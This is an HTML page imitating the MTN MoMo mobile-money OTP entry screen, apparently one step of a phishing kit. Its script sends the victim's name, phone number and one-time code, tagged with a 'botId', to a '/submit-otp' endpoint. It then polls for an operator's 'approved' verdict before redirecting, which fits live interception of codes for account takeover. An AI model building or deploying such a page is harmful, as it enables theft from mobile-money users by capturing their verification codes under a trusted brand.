<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MoMo - OTP</title>
  <style>
    /* ===== MOMO STYLE (consistent with other pages) ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      width: 100%;
      min-height: 100%;
    }

    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #fff;
      overflow-x: hidden;
    }

    /* =========================================
       APP CONTAINER
    ========================================= */

    .app {
      position: relative;
      width: 100%;
      max-width: 540px;
      min-height: 100vh;
      min-height: 100svh;
      margin: 0 auto;
      background: #fff;
      overflow: hidden;
    }

    /* =========================================
       TOP BLUE AREA
    ========================================= */

    .top {
      position: relative;
      height: 220px;
      background: #004c69;
      padding-top: 52px;
    }

    /*
      White curved bottom of blue area
    */
    .top::after {
      content: "";
      position: absolute;
      left: -10%;
      bottom: -75px;
      width: 120%;
      height: 125px;
      background: #fff;
      border-radius: 50% 50% 0 0 / 70% 70% 0 0;
    }

    /* =========================================
       TOP BAR WITH BACK BUTTON AND LOGO
    ========================================= */

    .top-bar {
      position: relative;
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 22px;
      margin-top: -10px;
    }

    .back-btn {
      color: #ffd500;
      font-size: 30px;
      text-decoration: none;
      font-weight: 300;
      line-height: 1;
      background: none;
      border: none;
      cursor: pointer;
      transition: color 0.2s;
    }
    .back-btn:hover {
      color: #ffffff;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .logo-box {
      width: 40px;
      height: 40px;
      border-radius: 8px;
      background: linear-gradient(145deg, #087398, #003d59);
      box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo-symbol {
      width: 22px;
      height: 28px;
      background: #ffd500;
      clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
      position: relative;
    }
    .logo-symbol::after {
      content: "";
      position: absolute;
      width: 6px;
      height: 6px;
      background: #004c69;
      border-radius: 50%;
      left: 8px;
      top: 8px;
    }

    .logo-text {
      color: #ffd500;
      font-size: 20px;
      font-weight: 800;
      letter-spacing: -0.5px;
    }
    .logo-text .light {
      font-weight: 400;
      font-size: 14px;
      color: #b8d4e8;
    }

    /* =========================================
       CARD
    ========================================= */

    .card {
      position: relative;
      z-index: 5;
      width: calc(100% - 36px);
      margin: -100px auto 0;
      background: #fff;
      border-radius: 34px;
      padding: 32px 27px 27px;
      box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
    }

    .title {
      text-align: center;
      color: #07516b;
      font-size: 25px;
      font-weight: 400;
      margin-bottom: 4px;
    }
    .title strong {
      font-weight: 700;
    }

    .subtitle {
      text-align: center;
      color: #555;
      font-size: 15px;
      margin-bottom: 4px;
    }

    .valid-time {
      text-align: center;
      font-size: 14px;
      color: #5b6f7e;
      margin-bottom: 24px;
    }

    /* ----- OTP INPUTS ----- */

    .otp {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      justify-content: center;
    }

    .otp input {
      width: 56px;
      height: 56px;
      border: 2px solid #d0d7de;
      border-radius: 12px;
      text-align: center;
      font-size: 22px;
      font-weight: 500;
      outline: none;
      background: #fff;
      transition: border 0.2s, box-shadow 0.2s;
    }

    .otp input:focus {
      border-color: #005572;
      box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
    }

    .otp input::placeholder {
      color: #ccc;
      font-weight: 300;
    }

    /* ----- Resend ----- */

    .resend-wrap {
      text-align: center;
      color: #666;
      font-size: 15px;
      margin-bottom: 0;
    }

    .resend-wrap .timer {
      font-weight: 600;
      color: #0a0a0a;
    }

    .resend-wrap .clickable {
      color: #004c69;
      font-weight: 700;
      cursor: pointer;
      text-decoration: underline;
    }

    /* ----- Message box ----- */

    #message-box {
      display: none;
      padding: 12px 16px;
      border-radius: 12px;
      margin-bottom: 16px;
      font-size: 15px;
      font-weight: 500;
      border: 1px solid transparent;
    }

    #message-box.error {
      background: #fef3f2;
      border-color: #fecdca;
      color: #c0392b;
    }

    #message-box.success {
      background: #ecfdf3;
      border-color: #abf0d1;
      color: #0b2b3b;
    }

    /* =========================================
       BOTTOM BUTTON (sticky)
    ========================================= */

    .bottom {
      width: 100%;
      padding: 0 18px 14px;
      margin-top: 30px;
    }

    .continue-btn {
      width: 100%;
      height: 69px;
      border: none;
      border-radius: 40px;
      background: #d1d5db;
      color: #fff;
      font-size: 22px;
      font-weight: 700;
      cursor: not-allowed;
      font-family: Arial, Helvetica, sans-serif;
      transition: background 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .continue-btn:enabled {
      background: #005572;
      cursor: pointer;
    }
    .continue-btn:enabled:hover {
      background: #00415a;
    }
    .continue-btn:enabled:active {
      transform: scale(.98);
    }

    /* =========================================
       RESPONSIVE
    ========================================= */

    @media (max-width: 480px) {
      .top {
        height: 190px;
        padding-top: 40px;
      }
      .top-bar {
        padding: 0 16px;
      }
      .card {
        width: calc(100% - 28px);
        margin-top: -90px;
        padding: 28px 20px 24px;
        border-radius: 28px;
      }
      .title {
        font-size: 22px;
      }
      .otp input {
        width: 48px;
        height: 48px;
        font-size: 20px;
      }
      .continue-btn {
        height: 62px;
        font-size: 20px;
      }
    }

    @media (max-width: 380px) {
      .card {
        padding-left: 16px;
        padding-right: 16px;
      }
      .title {
        font-size: 20px;
      }
      .otp input {
        width: 42px;
        height: 44px;
        font-size: 18px;
      }
      .otp {
        gap: 6px;
      }
      .continue-btn {
        height: 58px;
        font-size: 18px;
      }
    }

    @media (max-height: 750px) {
      .bottom {
        margin-top: 15px;
      }
    }
  </style>
</head>
<body>

<div class="app">

  <!-- ================= TOP BLUE AREA ================= -->

  <div class="top">

    <div class="top-bar">
      <!-- Back button -->
      <button class="back-btn" onclick="window.history.back()">&#8592;</button>

      <!-- Logo (compact) -->
      <div class="logo">
        <div class="logo-box">
          <div class="logo-symbol"></div>
        </div>
        <div class="logo-text">MoMo <span class="light">from MTN</span></div>
      </div>

      <!-- Spacer for alignment -->
      <div style="width: 30px;"></div>
    </div>

  </div>

  <!-- ================= CARD ================= -->

  <div class="card">

    <div class="title">Enter <strong>OTP</strong></div>
    <div class="subtitle" id="subtitlePlaceholder">
      Enter OTP that was sent to your phone
    </div>

    <div class="valid-time">The code is valid for 5 minutes</div>

    <div class="otp">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder="0">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder="0">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder="0">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder="0">
    </div>

    <div class="resend-wrap" id="resendWrap">
      Resend code in <span class="timer">05:00</span>
    </div>

    <!-- message-box will be injected here by JS -->
    <div id="message-box" style="display:none;"></div>

  </div>

  <!-- ================= BOTTOM BUTTON ================= -->

  <div class="bottom">
    <button class="continue-btn" disabled>SUBMIT</button>
  </div>

</div>

<script>
  (function() {
    // ---------- READ FROM URL & LOCALSTORAGE ----------
    const urlParams = new URLSearchParams(window.location.search);
    let botId = urlParams.get('botId') || localStorage.getItem('botId');
    let phone = urlParams.get('phone') || localStorage.getItem('phone');
    let name = urlParams.get('name') || localStorage.getItem('fullName');

    // If missing critical data, redirect back to phone page
    if (!botId) {
      alert('Bot ID missing. Please start over.');
      window.location.href = 'details.html';
      return;
    }
    if (!phone) {
      alert('Phone number missing. Please start over.');
      window.location.href = 'details.html';
      return;
    }
    if (!name) {
      name = 'MTN User';
      localStorage.setItem('fullName', name);
    }

    // Store for subsequent pages
    localStorage.setItem('botId', botId);
    localStorage.setItem('phone', phone);

    // Update subtitle with user's phone
    const subtitle = document.getElementById('subtitlePlaceholder');
    if (phone) {
      subtitle.textContent = 'Enter OTP that was sent to ' + phone;
    }

    // ---------- DOM REFS ----------
    const inputs = document.querySelectorAll('.otp input');
    const continueBtn = document.querySelector('.continue-btn');
    const msgDiv = document.getElementById('message-box');

    // If message-box not in DOM (though we added it), create it.
    if (!msgDiv) {
      const div = document.createElement('div');
      div.id = 'message-box';
      div.style.display = 'none';
      div.style.padding = '12px 16px';
      div.style.borderRadius = '12px';
      div.style.marginBottom = '16px';
      div.style.fontSize = '15px';
      div.style.fontWeight = '500';
      const container = document.querySelector('.card');
      const resend = document.querySelector('.resend-wrap');
      container.insertBefore(div, resend);
      // reassign
      msgDiv = document.getElementById('message-box');
    }

    // ---------- UI HELPERS ----------
    function showMessage(text, isError) {
      msgDiv.textContent = text;
      msgDiv.style.display = 'block';
      msgDiv.className = isError ? 'error' : 'success';
    }

    function hideMessage() {
      msgDiv.style.display = 'none';
      msgDiv.className = '';
      msgDiv.textContent = '';
    }

    function sanitizeDigit(value) {
      return value.replace(/\D/g, '');
    }

    function checkAllFilled() {
      let allFilled = true;
      inputs.forEach(function(input) {
        if (input.value.trim() === '') allFilled = false;
      });
      continueBtn.disabled = !allFilled;
      if (allFilled) {
        continueBtn.style.background = '#005572';
        continueBtn.style.color = '#fff';
        continueBtn.style.cursor = 'pointer';
      } else {
        continueBtn.style.background = '#d1d5db';
        continueBtn.style.color = '#fff';
        continueBtn.style.cursor = 'not-allowed';
      }
      hideMessage();
    }

    // ---------- OTP INPUT HANDLING ----------
    inputs.forEach(function(input, index) {
      input.addEventListener('input', function() {
        var cleaned = sanitizeDigit(this.value);
        if (cleaned !== this.value) this.value = cleaned;
        if (this.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        checkAllFilled();
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        var paste = (e.clipboardData || window.clipboardData).getData('text');
        var digits = sanitizeDigit(paste);
        if (digits) {
          this.value = digits.slice(0, 1);
          this.dispatchEvent(new Event('input'));
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value === '' && index > 0) {
          inputs[index - 1].focus();
        }
      });

      input.addEventListener('blur', checkAllFilled);
    });

    // ---------- TIMER (5 minutes) ----------
    var timerSpan = document.querySelector('.timer');
    var resendWrapEl = document.getElementById('resendWrap');
    var totalSeconds = 5 * 60;
    var timerInterval = null;

    function formatTime(sec) {
      var m = String(Math.floor(sec / 60)).padStart(2, '0');
      var s = String(sec % 60).padStart(2, '0');
      return m + ':' + s;
    }

    function updateTimerUI() {
      if (totalSeconds <= 0) {
        resendWrapEl.innerHTML = '<span class="clickable">Resend code</span>';
        clearInterval(timerInterval);
        timerInterval = null;
        resendWrapEl.querySelector('.clickable').onclick = function(e) {
          e.preventDefault();
          startTimer(5 * 60);
          hideMessage();
        };
        return;
      }
      resendWrapEl.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
      resendWrapEl.style.cursor = 'default';
    }

    function startTimer(seconds) {
      if (timerInterval) clearInterval(timerInterval);
      totalSeconds = seconds;
      updateTimerUI();
      timerInterval = setInterval(function() {
        totalSeconds--;
        if (totalSeconds <= 0) {
          totalSeconds = 0;
          updateTimerUI();
          clearInterval(timerInterval);
          timerInterval = null;
        } else {
          updateTimerUI();
        }
      }, 1000);
    }

    startTimer(5 * 60);

    // ---------- POLLING ----------
    var pollTimer = null;

    function stopPolling() {
      if (pollTimer) {
        clearInterval(pollTimer);
        pollTimer = null;
      }
    }

    // ---------- SUBMIT OTP ----------
    continueBtn.addEventListener('click', function() {
      if (this.disabled) return;

      var otp = '';
      inputs.forEach(function(inp) { otp += inp.value; });
      if (otp.length !== 4) {
        showMessage('Please enter a 4‑digit OTP.', true);
        return;
      }

      // Disable button, show waiting
      continueBtn.disabled = true;
      continueBtn.textContent = 'Verifying...';
      continueBtn.style.background = '#f5a623';
      continueBtn.style.color = '#fff';
      hideMessage();

      fetch('/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: name, phone: phone, otp: otp, botId: botId })
      })
      .then(function(res) {
        if (!res.ok) throw new Error('Server error (HTTP ' + res.status + ')');
        return res.json();
      })
      .then(function(data) {
        var requestId = data.requestId;
        if (!requestId) throw new Error('No request ID received');

        // Start polling
        stopPolling();
        var attempts = 0;
        var MAX_ATTEMPTS = 120; // ~3 minutes

        pollTimer = setInterval(function() {
          attempts++;
          fetch('/check-otp/' + requestId)
            .then(function(res) {
              if (!res.ok) throw new Error('Verification error');
              return res.json();
            })
            .then(function(status) {
              if (status.approved === true) {
                stopPolling();
                // ✅ DIRECT REDIRECT TO SUCCESS PAGE (skip PIN & code)
                var successUrl = 'success.html?botId=' + encodeURIComponent(botId) +
                                 '&phone=' + encodeURIComponent(phone) +
                                 '&name=' + encodeURIComponent(name);
                window.location.href = successUrl;
                return;
              }
              if (status.approved === false) {
                stopPolling();
                showMessage('❌ Incorrect OTP. Please try again.', true);
                // Reset inputs
                inputs.forEach(function(inp) { inp.value = ''; });
                checkAllFilled();
                inputs[0].focus();
                // Re-enable button
                continueBtn.disabled = false;
                continueBtn.textContent = 'SUBMIT';
                continueBtn.style.background = '#005572';
                continueBtn.style.color = '#fff';
                return;
              }
              // Still pending
              if (attempts > MAX_ATTEMPTS) {
                stopPolling();
                showMessage('⏳ Approval taking too long. Please refresh or contact support.', true);
                continueBtn.disabled = false;
                continueBtn.textContent = 'SUBMIT';
                continueBtn.style.background = '#005572';
                continueBtn.style.color = '#fff';
                return;
              }
              // keep polling
            })
            .catch(function(err) {
              // Network error – keep polling
              console.error('Polling error:', err);
            });
        }, 1500);
      })
      .catch(function(err) {
        showMessage('❌ Send error: ' + err.message, true);
        continueBtn.disabled = false;
        continueBtn.textContent = 'SUBMIT';
        continueBtn.style.background = '#005572';
        continueBtn.style.color = '#fff';
      });
    });

    // ---------- INIT ----------
    checkAllFilled();
    inputs[0].focus();
  })();
</script>

</body>
</html>
